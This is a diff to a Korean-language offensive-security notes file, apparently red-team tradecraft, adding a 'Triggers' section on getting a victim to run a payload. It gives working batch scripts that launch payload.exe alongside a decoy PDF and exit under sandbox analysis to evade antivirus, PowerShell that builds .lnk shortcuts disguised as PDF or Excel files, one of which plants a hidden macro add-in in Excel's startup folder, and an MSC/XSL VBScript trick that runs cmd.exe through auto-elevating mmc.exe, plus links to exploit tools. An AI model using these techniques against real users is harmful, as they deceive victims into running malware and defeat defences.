@@ -8,6 +8,7 @@
 - [Initial Access](#initial-access)
   - [Payloads](#payloads)
   - [Droppers](#droppers)
+  - [Triggers](#triggers)
 - [Persistence](#persistence)
   - [Boot & Logon Autostart Execution](#boot--logon-autostart-execution)
   - [Logon Script](#logon-script)
@@ -51,6 +52,102 @@ PS C:\Users\Attacker> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\Gadge
 - `-b` 옵션은 .NET Framework 4.8 이상에서 도입된 형식 검사 제어를 우회합니다.
 - `-o` 는 출력 경로(파일 확장자 제외)입니다.
 
+
+
+### Triggers
+---
+
+트리거는 사용자가 컨테이너 압축을 푼 후 상호 작용할 파일을 말한다. 일반적으로 더블 클릭처럼 최대한 간편하게 상호 작용할 수 있도록 하는 것이 좋다. 
+
+#### Batch
+
+> 간단한 배치 파일 예시
+``` cmd
+@echo off
+start payload.exe
+start decoy.pdf
+exit
+```
+
+- `%cmdcmdline%` - 인자를 포함한 실행된 원래 명령줄
+  - 예시: (더블 클릭으로 실행한 경우) `C:\Windows\system32\cmd.exe /c ""C:\Users\Daniel\Desktop\test.bat""`
+  - 예시: (명령어 프롬프트에서 실행한 경우) `"C:\Windows\system32\cmd.exe"`
+- `%~f0` - 배치 파일의 전체 경로
+  - 예시: ` C:\Users\Daniel\Desktop\test.bat`
+
+
+더블 클릭 이외에 배치 파일을 바로 종료하게 만들어 자동화된 바이러스 백신 및 샌드박스 분석을 무력화할 수 있다. 
+> `%cmdcmdline%` 내용에 배치 파일의 경로가 없는 경우 exit 호출
+
+``` cmd
+@echo off
+echo %cmdcmdline% | find /i "%~f0" || exit
+calc
+exit
+```
+
+
+#### Shell Link
+
+쉘 링크는 Windows 바로가기를 만드는 데 사용되는 바이너리 파일 형식을 말한다. 
+쉘 링크에는 다음과 같은 특징들이 있음
+- `.lnk` 파일 확장자에는 '파일 이름 확장자 표시' 옵션이 활성화되어 있어도 탐색기에 표시되지 않는다.
+- 이를 이용해 다음과 같은 파일 이름을 사용할 수 있다. `report.pdf.lnk` 하지만 실제 사용자에게는 `report.pdf`만 보이게 된다.
+- 링크 파일은 원하는 아이콘을 지정이 가능하여 원래는 cmd.exe로 연결되지만 PDF 아이콘을 사용하도록 위장할 수 있다. 
+
+> WScript.Shell을 통한 Shell Link 생성(PowerShell에서 동작)
+
+``` powershell
+$wsh = New-Object -ComObject WScript.Shell
+$lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
+$lnk.TargetPath = "%COMSPEC%"
+$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
+$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
+$lnk.Save()
+```
+
+> 엑셀로 위장
+
+``` powershell
+$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
+$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
+$lnk.Save()
+```
+
+
+#### Microsoft Saved Console
+
+마이크로소프트 저장 콘솔(.msc)과 패치가 되지 않은 XSS 취약점을 이용하여 Microsoft Management Console(mmc.exe)을 통해 JavaScript 코드 실행을 유발하는 취약점
+
+> MSC 예제 코드(105줄에 익스플로잇 코드 존재, 페이로드는 URL 인코딩 상태)
+> 
+[https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4](https://gist.github.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4)
+
+> cmd.exe 실행 예시
+
+``` xml
+<?xml version='1.0'?>
+<stylesheet
+    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+    xmlns:user="placeholder"
+    version="1.0">
+    <output method="text"/>
+    <ms:script implements-prefix="user" language="VBScript">
+    <![CDATA[
+        Set wshshell = CreateObject("WScript.Shell")
+        wshshell.run "C:\\Windows\\System32\\cmd.exe"
+]]></ms:script>
+</stylesheet>
+```
+
+MSC 파일을 더블 클릭하면 mmc.exe 인스턴스가 실행되고, mmc.exe는 다시 cmd.exe를 실행합니다. 이 기법의 장점 중 하나는 MMC가 자동 권한 상승 바이너리이므로 사용자가 로컬 관리자인 경우 UAC 프롬프트가 표시되어 승인을 요청받게 되며, 페이로드는 높은 보안 수준으로 실행된다
+
+<img width="310" height="82" alt="3b48cc0d95bae96505655d94d36aed58" src="https://github.com/user-attachments/assets/9675ee2d-4990-471c-af97-096793f22131" />
+
+
+> MSC 페이로드 자동화 생성 도구(MSC_Dropper)
+
+[https://github.com/ZERODETECTION/MSC_Dropper](https://github.com/ZERODETECTION/MSC_Dropper)
 
 
 ## Persistence
